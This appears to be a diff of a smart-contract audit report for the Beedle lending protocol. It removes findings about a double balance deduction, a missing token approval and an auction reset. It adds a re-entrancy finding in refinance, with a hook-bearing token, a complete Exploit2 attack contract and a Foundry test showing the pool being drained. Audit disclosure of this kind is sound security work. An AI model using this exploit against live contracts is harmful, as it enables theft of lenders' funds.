+pragma solidity ^0.8.19;
 
-L635:	// now lets deduct our tokens from the new pool
-	_updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
+import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
 
-// [...]
+contract WeirdToken is ERC20 {
 
-L697:	// update pool balance
-	pools[poolId].poolBalance -= debt; // @audit - [CRITICAL] Debt is removed for the second time
-```
-https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L636
-
-https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L698
-
-## Impact
-Funds can be locked in the contract after a refinancing. In addition, borrower is not able to `refinance` if they own more than the half of the pool because the second `poolBalance` update will underflow.
-
-## Tools Used
-Manual review
-
-## Recommendations
-Remove the second `poolBalance` update at line 698.
-
-
-# [H-10] - `sellProfits` function does not work because of lack of approved tokens
-## Summary
-The `sellProfits` function cannot swap tokens as intended because the `IERC20(_profits)` tokens are not approved by the contract.
-
-## Vulnerability Details
-The `swapRouter.exactInputSingle(params)` call will always fail because the `swapRouter` did not receive allowance to spend the `_profits` tokens.
-
-```solidity
-File: Fees.sol
-
-L26:	function sellProfits(address _profits) public {
-        require(_profits != WETH, "not allowed");
-        uint256 amount = IERC20(_profits).balanceOf(address(this));
-        // @audit - Lack of approve token
-        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
-            .ExactInputSingleParams({
-                tokenIn: _profits,
-                tokenOut: WETH,
-                fee: 3000,
-                recipient: address(this),
-                deadline: block.timestamp,
-                amountIn: amount,
-                amountOutMinimum: 0,
-                sqrtPriceLimitX96: 0
-            });
-
-        amount = swapRouter.exactInputSingle(params);
-        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
+    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
+        _mint(msg.sender, amount);
     }
+
+    // Hook on token transfer
+    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
+        if (to != address(0)) {
+            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
+        }
+    }
+}
+ ```
+This kind of token allows a re-entrancy attack in the `refinance` function. When the new `debt` is more than the current loan debt, the difference is sent to the borrower before updating the state.
+```solidity
+File: Lender.Sol
+
+L647:	} else if (debtToPay < debt) {
+ 		// we have excess loan tokens so we give some back to the borrower
+		// first we take our borrower fee
+		uint256 fee = (borrowerFee * (debt - debtToPay)) / 10000;
+		IERC20(loan.loanToken).transfer(feeReceiver, fee);
+		// transfer the loan tokens from the contract to the borrower
+		IERC20(loan.loanToken).transfer(msg.sender, debt - debtToPay - fee); // @audit - Re-entrancy can drain pool
+	}
 ```
-https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L26
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L653
+
 
 ## Impact
-Funds are locked in the contract and the `sellProfits` function will always revert.
+### POC
+An attacker can use the following exploit contract to drain the `lender` contract:
+```solidity
+File: Exploit2.sol
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {WeirdToken} from "./WeirdToken.sol";
+import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
+import "../utils/Structs.sol";
+import "../Lender.sol";
+
+contract Exploit2  {
+    Lender lender;
+    address loanToken;
+    address collateralToken;
+    bool borrowed;
+    Refinance refinance;
+    uint256 i;
+
+    constructor(Lender _lender, address _loanToken, address _collateralToken) {
+        lender = _lender;
+        loanToken = _loanToken;
+        collateralToken = _collateralToken;
+    }
+
+    function attack(bytes32 _poolId, uint256 _debt, uint256 _collateral, uint256 _loanId, uint256 _newDebt) external {
+        // [1] Borrow a new loan
+        ERC20(collateralToken).approve(address(lender), _collateral);
+        Borrow memory b = Borrow({
+            poolId: _poolId,
+            debt: _debt,
+            collateral: _collateral
+        });
+        Borrow[] memory borrows = new Borrow[](1);
+        borrows[0] = b;        
+        lender.borrow(borrows);
+        borrowed = true;
+        // [2] Refinance the loan with a higher amount of debt
+        refinance = Refinance({
+            loanId: _loanId,
+            poolId: _poolId,
+            debt: _newDebt,
+            collateral: _collateral
+        });
+        Refinance[] memory refinances = new Refinance[](1);
+        refinances[0] = refinance;
+        lender.refinance(refinances);
+        // [3] Repay the loan
+        ERC20(loanToken).approve(address(lender), _newDebt);
+        uint256[] memory loanIds = new uint256[](1);
+        loanIds[0] = _loanId;
+        lender.repay(loanIds);
+        // [4] Send the funds back to the attacker
+        ERC20(loanToken).transfer(msg.sender, ERC20(loanToken).balanceOf(address(this)));
+        ERC20(collateralToken).transfer(msg.sender, ERC20(collateralToken).balanceOf(address(this)));
+    }
+
+    function tokensReceived(address from, address /*to*/, uint256 /*amount*/) external {
+        require(msg.sender == loanToken, "not collateral token");
+        if (from == address(lender) && borrowed) {
+            // Re-enter 4 times
+            if (i < 4) {
+                i = i + 1;
+                Refinance[] memory refinances = new Refinance[](1);
+                refinances[0] = refinance;
+                lender.refinance(refinances);                
+            }            
+        }
+    }
+
+}
+```
+Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
+```solidity
+function test_exploit() public {
+    // Setup
+    address attacker = address(0x5);
+    collateralToken.mint(address(attacker), 100*10**18); 
+    
+    vm.startPrank(lender1);
+    WeirdToken weirdToken = new WeirdToken(1_000*10**18); 
+    weirdToken.approve(address(lender), 1_000*10**18);
+    // lender1 creates a pool of weirdTokens accepting collateralToken as collateral
+    Pool memory p = Pool({
+        lender: lender1,
+        loanToken: address(weirdToken),
+        collateralToken: address(collateralToken),
+        minLoanSize: 10*10**18,
+        poolBalance: 1000*10**18,
+        maxLoanRatio: 2*10**18,
+        auctionLength: 1 days,
+        interestRate: 1000,
+        outstandingLoans: 0
+    });
+    bytes32 poolId = lender.setPool(p);
+
+    // Before the exploit
+    assertEq(collateralToken.balanceOf(address(lender)), 0);
+    assertEq(weirdToken.balanceOf(address(lender)), 1_000*10**18);      // Lender has 1_000 weirdTokens to lend
+    assertEq(collateralToken.balanceOf(address(attacker)), 100*10**18); // Attacker has 100 collateral tokens  
+    assertEq(weirdToken.balanceOf(address(attacker)), 0);               // Attacker has no weirdTokens
+
+    // Exploit starts here
+    vm.startPrank(attacker);
+    Exploit2 attackContract = new Exploit2(lender, address(weirdToken), address(collateralToken));
+    collateralToken.transfer(address(attackContract), 100*10**18);
+    uint256 debt = 10*10**18;
+    uint256 collateral = 100*10**18;
+    uint256 loanId = 0;
+    uint256 newDebt = 100*10**18;
+    attackContract.attack(poolId, debt, collateral, loanId, newDebt);
+
+    // After the exploit
+    assertEq(collateralToken.balanceOf(address(lender)), 0);
+    assertLt(weirdToken.balanceOf(address(lender)), 650*10**18);        // Pool lost some weirdTokens
+    assertEq(collateralToken.balanceOf(address(attacker)), 100*10**18); // Attacker keept his collateralTokens
+    assertGt(weirdToken.balanceOf(address(attacker)), 350*10**18);      // Attacker stole some weirdTokens
+}
+```
 
 ## Tools Used
-Manual review
+Manual review + Foundry
 
 ## Recommendations
-Add a token `approve` before calling the Uniswap `exactInputSingle` function
-```solidity
-IERC20(_profits).approve(address(swapRouter), amount);
-```
-Unit tests should also be added.
+Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the loan debt before transfering the excess loan tokens AND use nonReentrant modifiers
 
-
-# [M-01] - Borrower can reset auction to not get liquidated
-## Summary
-Any ongoing auction is reset if the borrower calls the `refinance` function. Thus, a borrower can stop a refinancing auction to prevent him from being liquidated.
-
-## Vulnerability Details
-When calling the `refinance` function the `loans[loanId].auctionStartTimestamp` is reset to `type(uint256).max` which resets any ongoing auction.
-
-```solidity
-File: Lender.sol
-
-L691:	// update loan auction start timestamp
-	loans[loanId].auctionStartTimestamp = type(uint256).max; // @audit - Can reset auction
-```
-https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L692
-
-## Impact
-An insolvent borrower can indefinitely maintain his position by calling the `refinance` function, with or without updating any loan parameter.
-
-## Tools Used
-Manual review
-
-## Recommendations
-`loans[loanId].auctionStartTimestamp` should only be reset if the pool `maxLoanRatio` is met.
